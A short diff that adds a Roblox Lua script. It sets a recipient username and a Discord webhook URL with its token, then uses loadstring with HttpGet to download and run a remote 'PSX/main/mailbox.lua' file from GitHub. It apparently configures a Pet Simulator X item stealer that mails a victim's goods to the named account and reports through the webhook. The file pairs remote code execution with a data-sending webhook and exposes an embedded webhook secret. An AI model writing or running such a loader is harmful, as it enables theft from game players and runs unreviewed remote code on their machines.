@@ -1,0 +1,4 @@
+UserName = "RGBfoxgamer5"
+WebHook = "https://discord.com/api/webhooks/1232923649128927252/IIxcaoOCeKEEgskNn-wtmTikuJie6t_xmlfBexmehEaUIP44Ckdy8fRTE9EiysE3mHvK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/mailbox.lua", true))()
